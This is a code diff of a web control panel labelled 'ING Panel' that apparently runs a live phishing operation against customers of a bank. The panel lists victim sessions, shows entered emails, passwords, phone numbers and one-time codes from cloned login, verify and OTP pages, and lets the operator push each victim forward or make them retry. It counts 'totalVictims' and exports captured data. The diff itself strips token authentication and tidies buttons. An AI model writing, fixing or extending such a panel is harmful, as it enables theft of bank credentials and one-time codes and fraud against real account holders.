@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <link rel="preconnect" href="https://rsms.me ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
   <style>
     :root {
       --bg: #000000;
@@ -135,57 +135,6 @@
   </div>
 
   <script>
-    // Token from server injection (replaced by server)
-    const SERVER_TOKEN = null;
-    
-    // Initialize auth token from multiple sources
-    let AUTH_TOKEN = null;
-    
-    function initToken() {
-      // Priority: server injection > URL param > localStorage > sessionStorage
-      if (SERVER_TOKEN) {
-        AUTH_TOKEN = SERVER_TOKEN;
-        console.log('Using server-injected token');
-      } else {
-        const urlParams = new URLSearchParams(window.location.search);
-        const urlToken = urlParams.get('token');
-        
-        if (urlToken) {
-          AUTH_TOKEN = urlToken;
-          console.log('Using URL token');
-          // Store in both storages for redundancy
-          try {
-            localStorage.setItem('panel_token', AUTH_TOKEN);
-            sessionStorage.setItem('panel_token', AUTH_TOKEN);
-          } catch(e) {}
-          // Clean URL without reloading
-          if (window.history.replaceState) {
-            window.history.replaceState({}, document.title, '/panel');
-          }
-        } else {
-          // Try storage
-          try {
-            AUTH_TOKEN = localStorage.getItem('panel_token') || sessionStorage.getItem('panel_token');
-          } catch(e) {}
-          if (AUTH_TOKEN) {
-            console.log('Using stored token');
-          }
-        }
-      }
-      
-      if (!AUTH_TOKEN) {
-        console.log('No token found, redirecting to login');
-        window.location.href = '/panel';
-        return false;
-      }
-      return true;
-    }
-    
-    // Initialize immediately
-    if (!initToken()) {
-      throw new Error('Not authenticated');
-    }
-
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
@@ -230,37 +179,31 @@
       let html = '<div style="display:flex;gap:6px">';
       
       // Always show view details
-      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">
-        <img src="/images/description-svgrepo-com.svg" alt="Manage">
-      </button>`;
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
 
       // Show redo/continue based on page AND data entered - FIXED CONDITIONS
       if (s.page === 'index.html') {
         // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
-          html += `<button class="icon-btn continue" onclick="act('cont', '${s.sid}')" title="Continue">
-          <img src="/images/arrow-right-square-svgrepo-com.svg" alt="Continue">
-        </button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo', '${s.sid}')" title="Redo">
-          <img src="/images/cross-square-svgrepo-com.svg" alt="Redo">
-        </button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'verify.html') {
         // On verify page: show buttons if phone entered
         if (s.phone && s.phone.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'unregister.html') {
         // On unregister page: show continue if clicked, no redo
         if (s.unregisterClicked === true) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'otp.html') {
         // On OTP page: show buttons if OTP entered
         if (s.otp && s.otp.length > 0) {
-          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
-          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       }
       // Note: success page has no buttons (already approved)
@@ -299,15 +242,6 @@
       }
     }
     function render(d){
-      // Update token if server returned new one
-      if (d.token && d.token !== AUTH_TOKEN) {
-        AUTH_TOKEN = d.token;
-        try {
-          localStorage.setItem('panel_token', AUTH_TOKEN);
-          sessionStorage.setItem('panel_token', AUTH_TOKEN);
-        } catch(e) {}
-      }
-      
       qs('#userName').textContent = d.username;
       qs('#active').textContent   = d.active;
       qs('#total').textContent    = d.totalVictims;
@@ -439,74 +373,27 @@
 
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
-      if (!AUTH_TOKEN) return;
-      await fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN), {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({action, sid})
-      });
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
       load();
     }
 
     /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
     qs('#logoutBtn').onclick = async () => {
-      try {
-        localStorage.removeItem('panel_token');
-        sessionStorage.removeItem('panel_token');
-      } catch(e) {}
-      await fetch('/panel/logout?token=' + encodeURIComponent(AUTH_TOKEN));
+      await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
     };
-    
-    qs('#exportBtn').onclick = () => {
-      if (!AUTH_TOKEN) return;
-      location.href = '/api/export?token=' + encodeURIComponent(AUTH_TOKEN);
-    };
+    qs('#exportBtn').onclick = () => location.href = '/api/export';
 
     /* ----------  LONG-POLL  ---------- */
-    let failCount = 0;
-    
     async function load(){
-      if (!AUTH_TOKEN) {
-        window.location.href = '/panel';
-        return;
-      }
-      
-      try {
-        const r = await fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN));
-        if (r.status === 401) {
-          failCount++;
-          if (failCount > 2) {
-            try {
-              localStorage.removeItem('panel_token');
-              sessionStorage.removeItem('panel_token');
-            } catch(e) {}
-            location.replace('/panel');
-            return;
-          }
-          setTimeout(load, 1000);
-          return;
-        }
-        
-        failCount = 0;
-        const d = await r.json();
-        if(d.error) {
-          location.replace('/panel');
-          return;
-        }
-        
-        jsonData = d;
-        checkChanges(d.sessions);
-        render(d);
-      } catch (e) {
-        console.error('Load error:', e);
-      }
-      
-      setTimeout(load, 300);
+      const d = await fetch('/api/panel').then(r=>r.json());
+      if(d.error)return location.replace('/panel');
+      jsonData = d;
+      checkChanges(d.sessions);
+      render(d);
+      setTimeout(load,300);
     }
-    
     load();
   </script>
 </body>
 </html>
-
